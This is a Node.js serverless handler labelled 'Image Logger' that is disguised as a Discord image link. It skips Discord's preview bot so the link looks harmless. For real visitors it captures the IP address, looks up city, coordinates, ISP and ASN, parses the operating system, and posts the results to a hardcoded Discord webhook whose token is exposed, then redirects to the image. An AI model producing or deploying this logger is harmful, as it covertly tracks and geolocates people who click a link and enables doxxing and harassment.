import https from 'https';

// ─── CHANGE THIS IMAGE URL ANYTIME ───
const IMAGE_URL = 'https://cdn.discordapp.com/attachments/1521991858409046232/1534000440360960150/IMG_2448.png?ex=6a7288bd&is=6a71373d&hm=2cdf6f9bc918c514cfb3855dfe89ebaf9bbf45cd79e927968a169f23acd5902f&';
// ─────────────────────────────────────

export default async function handler(req, res) {
    const ip = req.headers['x-forwarded-for']?.split(',')[0].trim() || req.socket.remoteAddress || null;
    const ua = req.headers['user-agent'] || '';

    // ─── IGNORE DISCORD BOT ───
    if (ua.includes('Discordbot')) {
        res.writeHead(302, { Location: IMAGE_URL });
        res.end();
        return;
    }

    // ─── Only log real users ───
    const time = new Date().toISOString().replace('T', ' ').slice(0, 19);
    const fields = [];
    if (ip) fields.push({ name: '🌐 IP', value: `\`${ip}\``, inline: false });

    let geo = {};
    if (ip) {
        try {
            const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,countryCode,regionName,city,isp,org,timezone,loc,as`);
            if (geoRes.ok) {
                const data = await geoRes.json();
                if (data.status === 'success') geo = data;
            }
        } catch (_) {}
    }

    if (geo.country) {
        const code = geo.countryCode || 'UN';
        const flag = code.length === 2 ? String.fromCodePoint(...code.toUpperCase().split('').map(ch => 0x1F1E6 + ch.charCodeAt(0) - 65)) : '🌍';
        fields.push({ name: `${flag} Country`, value: `${geo.country}${geo.countryCode ? ` (${geo.countryCode})` : ''}`, inline: true });
    }
    if (geo.regionName) fields.push({ name: '📍 Region', value: geo.regionName, inline: true });
    if (geo.city) fields.push({ name: '🏙️ City', value: geo.city, inline: true });
    if (geo.loc) fields.push({ name: '🗺️ Location', value: `\`${geo.loc}\``, inline: false });
    if (geo.timezone) fields.push({ name: '⏰ Timezone', value: geo.timezone, inline: true });
    if (geo.isp) fields.push({ name: '🏢 ISP', value: geo.isp, inline: true });
    if (geo.org && geo.org !== geo.isp) fields.push({ name: '📋 Org', value: geo.org, inline: true });
    if (geo.as) fields.push({ name: '🔢 ASN', value: geo.as, inline: true });

    // ─── Parse OS from User-Agent ───
    let os = null;
    if (ua) {
        if (ua.includes('Windows')) os = 'Windows';
        else if (ua.includes('Mac OS')) os = 'macOS';
        else if (ua.includes('Linux')) os = 'Linux';
        else if (ua.includes('Android')) os = 'Android';
        else if (ua.includes('iOS') || ua.includes('iPhone') || ua.includes('iPad')) os = 'iOS';
        else if (ua.includes('Chrome OS')) os = 'ChromeOS';
        else if (ua.includes('Ubuntu')) os = 'Ubuntu';
    }
    if (os) fields.push({ name: '💻 OS', value: os, inline: true });

    fields.push({ name: '📅 Timestamp', value: `\`${time}\``, inline: false });

    const embed = {
        title: '🕵️ New Click',
        color: 0x00ff88,
        fields: fields,
        footer: { text: 'Image Logger • Powered by Vercel' }
    };

    // ─── Send to Discord webhook ───
    const webhook = 'https://discord.com/api/webhooks/1532494338477785189/piKPDYGbTysmL3tPK_HQckufpf28oSRKvUAGkt5aHA2EiSyGAMZyOphc464WIJA20Atr';
    const payload = JSON.stringify({ embeds: [embed] });
    const options = {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(payload) }
    };
    const discordReq = https.request(webhook, options, () => {});
    discordReq.write(payload);
    discordReq.end();

    // ─── REDIRECT to image ───
    res.writeHead(302, { Location: IMAGE_URL });
    res.end();
}
